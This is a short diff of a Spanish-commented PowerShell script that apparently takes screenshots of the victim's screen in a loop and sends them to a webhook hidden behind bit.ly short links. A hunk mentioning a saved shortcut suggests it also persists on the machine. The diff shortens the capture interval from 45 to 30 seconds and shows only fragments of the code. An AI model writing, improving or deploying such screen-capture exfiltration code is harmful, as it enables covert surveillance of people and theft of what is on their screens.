@@ -1,7 +1,7 @@
- # Definir el URL del script y el webhook
+# Definir el URL del script y el webhook
 $scriptURL = "https://bit.ly/Screen_dc"
 $webhookURL = "https://bit.ly/web_chupakbras"
-$seconds = 45 # Intervalo de captura de pantalla en segundos
+$seconds = 30 # Intervalo de captura de pantalla en segundos
 $a = 1 # Cantidad de capturas de pantalla
 
 # Función para enviar la imagen al webhook
@@ -71,4 +71,3 @@ $shortcut.Save()
 
 # Iniciar el bucle de capturas de pantalla después de enviar la primera imagen
 Start-ScreenshotLoop
-
